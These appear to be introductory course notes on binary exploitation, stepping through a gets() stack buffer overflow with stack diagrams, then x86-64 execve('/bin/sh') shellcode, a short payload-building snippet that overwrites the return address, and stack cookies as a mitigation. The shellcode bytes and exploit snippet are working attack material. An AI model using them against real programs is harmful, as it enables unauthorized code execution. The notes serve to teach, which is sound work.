# Introduction
## Goals of Pwning
The goal of exploiting binaries is  to get our own code running
Usually, we try to get the target binary to open a shell on our behalf
* Code that achieves this goal == `Shellcode`
* Shellcode != Exploit
	* Shellcode is the code that runs as a part of exploiting a vulnerability
## Vulnerabilities
A vulnerabilty is a flaw in a program that might let us exploit it
* some exploits may require several vulnerabilities to exploit
#### Ex: Spot the Bug
```c
int x = 0xdead;
char buf[32] = {0};
gets(buf); // Right here
printf("Hi, %s\n", buf);
if (x == 0x1337) { puts("Hi friend”);}
else { puts("You're not my friend!”); }
```
Why is this an issue
#### `man gets`
```
<snip>
SECURITY CONSIDERATIONS
     The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the calling program to reliably determine the length of the next incoming line, the use of this function enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack.  It is strongly suggested that the fgets() function be used in all cases.
<snip>
```

# Vulnerabilities in Action
## Stack Frames
#### 1)
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
#### 2)
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
#### 3) `push rbp`
###### Code:
```
main:
	push rbp <--
```
###### Stack Before:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
###### Stack After:
|  Stack |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
#### 4) `mov rbp, rsp`
###### Code:
```
main:
	push rbp
	mov rbp, rsp <--
```
###### Stack Does Not Change:
|  Stack |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
#### 5) `sub rsp, 0x28`
###### Code:
```
main:
	push rbp
	mov rbp, rsp 
	sub rsp, 0x28 <--
```

###### Stack Before:
|  Stack |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>0xdead (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0  (8B)|
#### 6) The "Full Code"
###### Code:
```
main:
	push rbp
	mov rbp, rsp 
	sub rsp, 0x28
	<lots of code>
	lea rax, [rbp-0x28]
	mov rdi, rax
	call gets
```

###### Stack
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>0xdead (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0  (8B)|
### And now we run it
#### 1) I enter an `'A'`

###### Stack Before:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>0xdead (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0  (8B)|
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>0xdead (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0, 0, 0, 0, 0, 0, 0, 0, (8B)  <br>0x41, 0, 0, 0, 0, 0, 0, 0  (8B) |
#### 2) I enter 7 more `'A'`s for a total of 8
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>0xdead (8B)  <br>00, 00, 00, 00, 00, 00, 00, 00, (8B)  <br>00, 00, 00, 00, 00, 00, 00, 00, (8B)  <br>00, 00, 00, 00, 00, 00, 00, 00, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41  (8B) |
#### 3) I enter 31 total `'A'`s 
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>ad, de, 00, 00, 00, 00, 00, 00, (8B)  <br>41, 41, 41, 41, 41, 41, 00, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41  (8B)<br>41, 41, 41, 41, 41 |
#### 3) I enter that 32nd `'A'` 
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>00, de, 00, 00, 00, 00, 00, 00, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41  (8B)<br>41, 41, 41, 41, 41 |
Why was that first value, `ad` in the last one, replaced with `00`?
We've overwritten the place that stored `0xdead`
#### 4) I add 3 `'B'`s
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B)|
|Saved RBP (8B)|
|Locals:  <br>42, 42, 42, 00, 00, 00, 00, 00, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41  (8B)<br>41, 41, 41, 41, 41 |
Rewriting Stack to show addresses now that things are getting interesting:
###### Stack
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B):<br>57, 07, 04, 00, 00, 00, 00, 00 |
|Saved RBP (8B):<br>d0, db, ff, ff, 7f, 00, 00, 00 |
|Locals:  <br>42, 42, 42, 00, 00, 00, 00, 00, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41  (8B)<br>41, 41, 41, 41, 41 |
#### 5) I add 40 `'A'`s
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B):<br>57, 07, 04, 00, 00, 00, 00, 00 |
|Saved RBP (8B):<br>d0, db, ff, ff, 7f, 00, 00, 00 |
|Locals:  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B) <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B)<br>41, 41, 41, 41, 41, 41, 41, 41  (8B) |
#### 6) 8 More `'A'`s
###### Stack After:
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B):<br>57, 07, 04, 00, 00, 00, 00, 00 |
|Saved RBP (8B):<br>41, 41, 41, 41, 41, 41, 41, 41 |
|Locals:  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B) <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B)<br>41, 41, 41, 41, 41, 41, 41, 41  (8B) |
#### 6) 56 Total `'A'`s!
###### Stack After:
| Stack |  |
| ---- | ---- |
| Parent Function’s Stack Frame  <br>…  <br>… |  |
| Return Address (8B):<br>41, 41, 41, 41, 41, 41, 41, 41 |  |
| Saved RBP (8B):<br>41, 41, 41, 41, 41, 41, 41, 41 |  |
| Locals:  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B) <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41, (8B)  <br>41, 41, 41, 41, 41, 41, 41, 41,  (8B)<br>41, 41, 41, 41, 41, 41, 41, 41  (8B) |  |
##### So What Happens If This Runs?
```c
main:
	push rbp
	mov rbp, rsp
	sub rsp, 0x28
	//<lots of code>
	lea rax, [rbp-0x28]
	mov rdi, rax
	call gets
	//<more code>
	ret
```
###### `Segmentation fault (core dumped)`

# Code Execution (Pwning)
## We Control `RIP`
We can redirect the program to run anything we want
### Assume there's some function called `give_shell` at `0x4006a6`
If we overwrite `RIP` with that value, we get a shell (though most programs won't give us a nice easy function like that)
## Bring Your Own Code (BYOC)
* If we don't have a function to jump to...make our own!
* Put it somewhere in the program, jump to it, and it will run!
* In this case, if we know the stack pointer, we know where to jump
## Shellcode Intro
The basic idea of most shellcode is you execute something like this C Code:
```
execve("/bin/sh?, 0, 0)
```
This usually has to be done in a roundabout way
###### Code:
```c
/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax

/* call execve(rsp, 0, 0) */
mov rdi, rsp
xor esi, esi
push 0x3b
pop rax
cdq /* Set rdx to 0 since rax is known to be positive */
syscall
```
## Shellcode Demo
| Stack  |
|---|
|Parent Function’s Stack Frame  <br>…  <br>…|
|Return Address (8B):<br>d0, db, ff, ff, ff, 7f, 00, 00 |
|Saved RBP (8B):<br>41, 41, 41, 41, 41, 41, 41, 4 |
|Locals:  <br>41, 41, 41, 41, 41, 41, 41, 41  <br><shc end>, 41, 41, 41, 41, 41  <br><third 8 bytes of shc>  <br><second 8 bytes of shc>  <br><first 8 bytes of shc>|
```c
rsp = 0x7fffffffdbd0
shc = \
‘6A6848B82F62696E’ \
‘2F2F2F73504889E7’ \
‘31F66A3B58990F05’.decode(‘hex’)
exploit = shc.ljust(0x40, ‘A’)
exploit+= p64(rsp)
```

# Mitigations
## Stack Cookies
If we put a special, secret, value on the stack, we can check it before we return
###### Preamble:
```
mov rax, qword fs:[0x28]
mov qword [rbp-0x8], rax
```
###### Before Return:
```
mov rdx, qword [rbp-0x8]
xor rdx, qword fs:[0x28]
je 0x40079f
call _stack_chk_fail
```
Cookies
* Cookies are generated at program startup
* 8 bytes on 64-bit
* The first byte (the one placed closest to your stack locals) is always a `NULL` byte
	* This helps stop string reads from leaking the cookie
* We will learn  how to get around these next week

# Writeups
[[Stack Buffer Overflow]]
[[Introduction to Pwning]]
[[Registers]]

# Challenges
[[Boffin]]
[[Lockbox]]